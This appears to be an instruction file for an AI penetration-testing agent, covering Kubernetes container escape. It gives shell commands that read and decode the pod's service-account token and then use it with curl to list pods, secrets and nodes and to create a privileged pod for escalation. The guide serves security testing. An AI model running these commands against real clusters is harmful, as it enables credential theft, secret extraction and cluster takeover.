<kubernetes_escape_guide>
<title>KUBERNETES SECURITY TESTING AND CONTAINER ESCAPE</title>

<critical>Kubernetes environments require specialized testing for container escape, service account abuse, RBAC misconfiguration, privileged container attacks, node compromise, and secrets enumeration. Focus on breaking out of container isolation and achieving cluster-wide access.</critical>

<scope>
- Container escape techniques (privileged, hostPath, hostPID, hostNetwork)
- Service account token abuse and privilege escalation
- RBAC misconfiguration exploitation
- Privileged container and capability attacks
- Node-level compromise and lateral movement
- Secrets enumeration and extraction
- Kubernetes API server exploitation
- Pod security policy bypass
- Network policy circumvention
</scope>

<methodology>
1. Enumerate Kubernetes environment (version, RBAC, service accounts)
2. Extract and test service account tokens
3. Probe Kubernetes API for accessible resources
4. Identify escape vectors (privileged pods, hostPath mounts, etc.)
5. Test RBAC permissions and potential escalation paths
6. Enumerate secrets and configmaps
7. Attempt node access via kubelet or SSH
8. Test lateral movement to other pods/namespaces
</methodology>

<environment_enumeration>
<detection>
{% raw %}
# Detect if running in Kubernetes

# Check for service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check environment variables
env | grep KUBERNETES
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# Check for .dockerenv or cgroup
ls -la /.dockerenv
cat /proc/1/cgroup | grep -i kube
cat /proc/self/cgroup | grep -i kube

# DNS discovery
nslookup kubernetes.default.svc.cluster.local
nslookup kubernetes.default

# Check mounted secrets
mount | grep secret
df | grep secret
{% endraw %}
</detection>

<version_discovery>
{% raw %}
# Identify Kubernetes version

# Via API server
curl -k https://kubernetes.default.svc/version
curl -k https://$KUBERNETES_SERVICE_HOST/version

# From kubelet (if accessible)
curl -k https://localhost:10250/version
curl -k https://<node-ip>:10250/version

# Check manifests
cat /etc/kubernetes/manifests/*.yaml 2>/dev/null

# Container runtime
docker --version 2>/dev/null
crictl --version 2>/dev/null
containerd --version 2>/dev/null
{% endraw %}
</version_discovery>
</environment_enumeration>

<service_account_abuse>
<token_extraction>
{% raw %}
# Extract service account token

# Default location
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Display token
echo $TOKEN

# Decode JWT (base64 decode middle section)
echo $TOKEN | cut -d '.' -f2 | base64 -d 2>/dev/null | jq .

# Token includes:
# - Service account name
# - Namespace
# - Expiration
# - Kubernetes API audience
{% endraw %}
</token_extraction>

<api_access>
{% raw %}
# Test API access with service account token

# Basic API call
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1

# List pods in current namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# List all pods (if permitted)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/pods

# List secrets in namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# List all secrets (if permitted)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets

# List nodes (usually admin only)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/nodes

# Create pod (privilege escalation attempt)
curl -k -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
  -d @privileged-pod.json
{% endraw %}
</api_access>

